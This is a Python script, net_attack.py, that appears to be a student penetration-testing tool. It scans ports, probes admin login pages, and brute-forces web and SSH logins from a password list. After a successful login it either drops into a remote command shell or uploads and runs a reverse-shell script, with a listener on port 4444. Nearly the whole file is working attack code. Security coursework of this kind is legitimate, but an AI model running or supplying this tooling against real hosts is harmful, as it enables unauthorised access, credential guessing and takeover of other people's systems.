#!/usr/bin/python3

# Importing necessary libraries
import argparse
from scapy.all import *
import socket
from os import linesep
import requests
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, Transport, SFTPClient

# Function to check connectivity to a target IP
def checkConnectivity(target_ip_addr):
	ipkt = IP(dst=target_ip_addr)/ICMP()
	response = sr1(ipkt, timeout=5, verbose=0)
	return True if response else False

# Function to scan specific ports on a target IP
def scanPorts(target_ip_addr, port_s):
	port_status_dict = {}
	for p in port_s:
		try:
			soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			soc.settimeout(1)
			status = soc.connect_ex((target_ip_addr,p))
			try:
				service = socket.getservbyport(p,"tcp") # Identify service running on the port
			except:
				service = "unknown"
			if (status == 0):
				port_status_dict[p] = {"state":"open", "service":service}
			else:
				port_status_dict[p] = {"state":"closed", "service":service}
			soc.close()
		except:
			port_status_dict[p] = {"state":"error", "service":"unknown"}
	return port_status_dict

# Function to confirm if an SSH service is running on the target
def confirmSSH(target_ip_addr, port=22):
	try:
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		soc.connect((target_ip_addr, port))
		banner = soc.recv(1024).decode() # Read the service banner
		return True if "SSH" in banner else False
	except:
		return False

# Function to confirm if an HTTP service is running on the target
def confirmHTTP(target_ip_addr, port=80):
	try:
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		soc.connect((target_ip_addr, port))
		soc.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n") # Send an HTTP request
		banner = soc.recv(1024).decode() # Read the service banner
		return True if "HTTP" in banner else False
	except:
		return False

# Function to find accessible web pages or directories
def dirBuster(target_ip_addr, username, pswdList):
	webPages = ["login.php", "admin.php", "admin/login.php", "admin/admin.php"]
	for page in webPages:
		url = f"http://{target_ip_addr}/{page}"
		try:
			webResponse = requests.get(url)
			if webResponse.status_code == 200:
				print("")
				print(f"Busted! Found accessible page -> {url}")
				if "<form" in webResponse.text: # Check for login form
					print(f"Form found -> {url}")
					bruteforceWeb(url, username, pswdList)
		except:
			continue

# Function to brute-force web login page
def bruteforceWeb(url, username, passwordList):
	with open(passwordList, 'r', errors='replace') as f:
		pswds = f.readlines()
	for pswd in pswds:
		pswd = pswd.strip()
		try:
			webResponse = requests.post(url, data={'username': username, 'password': pswd})
			if "type=\'password\'" not in webResponse.text and webResponse.status_code == 200:
				print(f"Bruteforced! Login Successful with ==> {username}:{pswd}")
				return
		except:
			continue
	print(f"Unsuccessful! No valid credentails pairing found.")

# Function to brute-force SSH login
def bruteforceSSH(target_ip_addr, username, passwordList):
	with open(passwordList, 'r', errors='replace') as f:
		pswds = f.readlines()
	for pswd in pswds:
		pswd = pswd.strip()
		try:
			sshClient = SSHClient()
			sshClient.set_missing_host_key_policy(AutoAddPolicy())
			sshClient.connect(target_ip_addr, username=username, password=pswd)
			print(f"Bruteforced! Successful SSH login with ==> {username}:{pswd}")
			# User input for post-exploitation activity
			dropShell = input(f"Drop to shell on target {target_ip_addr}? (y/N/P): ").strip().lower()
			sshShell(sshClient, target_ip_addr) if dropShell == "y" else None #Invoking interactive SSH shell
			reverseShell(sshClient, target_ip_addr, username, pswd) if dropShell == "p" else None #Invoking reverse shell
			sshClient.close()
			return
		except AuthenticationException:
			continue
	print(f"Unsuccessful! No valid credentails pairing found.")

# Function to interact with an SSH shell
def sshShell(sshClient, target_ip_addr):
	try:
		while True:
			shellCmd = input(f"{target_ip_addr} shell >> ")
			if shellCmd.lower() == "exit":
				break
			stdin, stdout, stderr = sshClient.exec_command(shellCmd)
			print(stdout.read().decode() + stderr.read().decode())
	except:
		exit()

# Function to upload and execute a reverse shell script via SSH
def reverseShell(sshClient, target_ip_addr, username, pswd):
	try:
		ScriptTransfer = Transport((target_ip_addr, 22))
		ScriptTransfer.connect(username=username, password=pswd)
		#uploading the reverse shell script to the target
		sftp = SFTPClient.from_transport(ScriptTransfer)
		sftp.put("/shell.py" , f"/home/{username}/shell.py")
		print(f"Reverse shell uploaded on {target_ip_addr} and executed.")
		sftp.close()
		ScriptTransfer.close()
		#Executing the reverse shell script on the target
		stdin, stdout, stderr = sshClient.exec_command('python3 shell.py')
		reverseshell_listener() # Listener to handle reverse shell connection
	except:
		exit()

# Function to listen for a reverse shell connection
def reverseshell_listener():
	try:
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		# Binding the listener to all interfaces on port 4444
		soc.bind(("0.0.0.0", 4444))
		soc.listen(1)
		client_soc, client_addr = soc.accept()
		while True:
			shellCmd = input("reverse shell >> ").strip()
			if shellCmd.lower() == "exit":
				client_soc.send(b"exit")
				client_soc.close()
				break
			# Sending command to the reverse shell and receiving the response
			client_soc.send(shellCmd.encode())
			response = client_soc.recv(4096).decode()
			print(response)
	except Exception as e:
		print(f"Error: {e}")

# Main function to parse arguments and run the program
def main():
	#Parse user provided arguments
	sh_parser = argparse.ArgumentParser(
						prog="net_attack.py",
						description="Automates the identification of weak usernames and passwords in common services and facilitates post-exploitation activities.",
						epilog="Author: Samip Hegde - R00259398",
						add_help=False
						)
	sh_parser.add_argument("-h", "--help",action='help', default=argparse.SUPPRESS, help="Show the help option and usage instructions for the tool.")
	requiredArgs = sh_parser.add_argument_group("Required arguments")
	requiredArgs.add_argument("-t", "--target", help="IP address of the target host.", required = True)
	requiredArgs.add_argument("-p", "--ports", help="Comma-separated list of ports to scan on the target host.", required = True)
	requiredArgs.add_argument("-u", "--username", help="Username to use for login attempts.", required = True)
	requiredArgs.add_argument("-l", "--password-list",help="Filename containing a list of passwords.", required = True)
	args = sh_parser.parse_args()
	ports = [int(i) for i in args.ports.split(",")]

	#Check Connectivity to the target
	if not checkConnectivity(args.target):
		print(f"Target {args.target} is unreachable.")
		exit()
	else:
		print(f"Target {args.target} is reachable.")

	#Port Scanning
	print("", "Port Scan Results:", sep=linesep)
	print("-"*29)
	print("Port".ljust(10), "State".ljust(10), "Service")
	print("-"*29)
	for port, details in scanPorts(args.target, ports).items():
		print(str(port).ljust(10), details['state'].ljust(10), details['service'])

	#Directory Busting
	dirBuster(args.target, args.username, args.password_list) if confirmHTTP(args.target) and 80 in ports else None

	#Bruteforcing SSH
	bruteforceSSH(args.target, args.username, args.password_list) if confirmSSH(args.target) and 22 in ports else None


if __name__ == "__main__":
	main()

